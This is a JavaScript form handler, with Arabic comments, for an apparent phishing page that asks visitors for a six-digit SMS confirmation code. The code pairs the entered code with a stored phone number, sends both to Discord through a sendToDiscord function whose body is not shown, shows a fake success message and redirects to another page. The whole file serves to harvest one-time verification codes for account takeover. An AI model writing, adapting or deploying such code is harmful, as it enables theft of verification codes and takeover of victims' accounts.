// معالج نموذج رمز التأكيد عبر الرسائل

document.addEventListener('DOMContentLoaded', function() {
    const form = document.getElementById('confirmationForm');
    const codeInput = document.getElementById('aboutBtn');
    const submitBtn = document.getElementById('confirmCodeBtn');
    const errorMsg = document.getElementById('errorMsg');
    const successMsg = document.getElementById('successMsg');

    form.addEventListener('submit', async function(e) {
        e.preventDefault();
        
        // إخفاء الرسائل السابقة
        errorMsg.style.display = 'none';
        successMsg.style.display = 'none';
        
        const code = codeInput.value.trim();
        
        // التحقق من الرمز
        if (!validateCode(code)) {
            errorMsg.textContent = '⚠️ يرجى إدخال رمز التأكيد المكون من 6 أرقام';
            errorMsg.style.display = 'block';
            return;
        }
        
        // تعطيل النموذج
        disableForm('confirmationForm');
        
        try {
            // الحصول على رقم الهاتف المحفوظ
            const contactNumber = getFromStorage('contactNumber') || 'غير معروف';
            
            // تنسيق الرسالة
            const message = `
✅     الرسائل
📱 رقم التواصل: ${contactNumber}
🔢 رمز التأكيد: ${code}
    = = = = = = = = 
`;
            
            // إرسال البيانات إلى Discord
            const success = await sendToDiscord(message);
            
            if (success) {
                successMsg.textContent = '✅ تم إرسال رمز التأكيد بنجاح';
                successMsg.style.display = 'block';
                
                // عرض نافذة التحميل
                showLoading();
                
                // الانتظار 2 ثانية ثم الانتقال
                setTimeout(() => {
                    window.location.href = 'template.html';
                }, 2000);
            } else {
                errorMsg.textContent = '❌ فشل الإرسال، يرجى المحاولة لاحقاً';
                errorMsg.style.display = 'block';
                enableForm('confirmationForm');
            }
        } catch (error) {
            console.error('خطأ:', error);
            errorMsg.textContent = '❌ فشل الإرسال، يرجى المحاولة لاحقاً';
            errorMsg.style.display = 'block';
            enableForm('confirmationForm');
        }
    });
    
    // السماح بالأرقام فقط
    codeInput.addEventListener('input', function(e) {
        this.value = this.value.replace(/[^0-9]/g, '');
    });
});